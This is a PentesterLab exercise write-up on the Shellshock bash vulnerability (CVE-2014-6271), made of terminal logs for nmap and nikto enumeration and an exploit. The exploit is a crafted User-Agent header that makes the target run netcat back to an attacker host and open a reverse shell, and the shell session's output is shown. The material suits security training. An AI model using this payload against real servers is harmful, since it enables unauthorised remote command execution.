# Pentesterlab Exercises

## CVE-2014-6271

```
$ # enumeration
$ nmap vulnerable

Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-18 21:41 EDT
Nmap scan report for vulnerable
Host is up (0.0028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
$
$ nikto -host vulnerable
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.121.134
+ Target Hostname:    vulnerable
+ Target Port:        80
+ Start Time:         2016-05-18 21:42:54 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (Unix) DAV/2
+ Server leaks inodes via ETags, header found with file /, inode: 8188, size: 1704, mtime: Thu Sep 25 05:56:50 2014
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ Uncommon header 'nikto-added-cve-2014-6271' found, with contents: true
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ 8345 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2016-05-18 21:43:03 (GMT-4) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
$
$ firefox vulnerable/
$ firefox vulnerable/cgi-bin/status
$
$ # start up netcat listener in other term first
$ # exploit
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; $(which nc) attacker 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
HTTP/1.1 500 Internal Server Error
Date: Wed, 18 May 2016 21:50:37 GMT
Server: Apache/2.2.21 (Unix) DAV/2
Connection: close
Content-Type: text/html; charset=iso-8859-1

$
```

```
$ # netcat listener for catching reverse connection
$ nc -l -p 443
pwd
id
uname -a
exit
/var/www/cgi-bin
uid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab)
Linux vulnerable 3.14.1-pentesterlab #1 SMP Sun Jul 6 09:16:00 EST 2014 i686 GNU/Linux
$
$ # commands were buffered so reverse shell immediately closed after execution
```
